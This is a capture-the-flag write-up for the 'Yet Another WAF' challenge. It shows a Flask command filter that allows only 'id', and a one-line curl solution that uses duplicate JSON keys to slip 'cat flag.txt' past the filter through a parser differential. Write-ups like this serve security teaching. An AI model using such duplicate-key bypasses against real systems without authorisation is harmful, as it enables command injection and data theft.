# Yet Another WAF

> You can't hack me if you can only call "id", right?
>
> [runner.7z](https://hack.cert.pl/files/runner-7fe7948b7ee8f1b9088f88972c7cd6ce6dbd79d6.7z)
>
> [https://yaw.ecsc25.hack.cert.pl/](https://yaw.ecsc25.hack.cert.pl/)
>
> **app.py**
> ```py
> import json
> import requests
> from flask import Flask, request, abort
> 
> app = Flask(__name__)
> 
> 
> @app.route('/run', methods=['POST'])
> def run():
>     payload = json.loads(request.data)
>     if 'cmd' in payload:
>         command = payload['cmd']
>         if command != 'id':
>             abort(403)
>         else:
>             payload = f'{{"content":{request.data.decode()}}}'
>             print(payload)
>             r = requests.post("http://runner/api/run", headers={"Content-Type": "application/json"}, data=payload)
>             return r.content
>     else:
>         abort(404)
> 
> 
> @app.get("/")
> def index():
>     return "You can't connect to this API with your browser. Check the source code."
> 
> 
> if __name__ == "__main__":
>     app.run(port=5000)
> ```

## Solution
Seeing how the Python app happily parses the JSON body and then forwards unparsed JSON to some other app, it can be easily guessed that the challenge is about parser differentials. The solution is simply:

```sh
$ curl -X POST https://yaw.ecsc25.hack.cert.pl/run -H 'Content-type: application/json' -d '{"cmd": "cat flag.txt", "cmd": "id"}'
```

## Flag
`ecsc25{names_within_an_object_SHOULD_be_unique}`
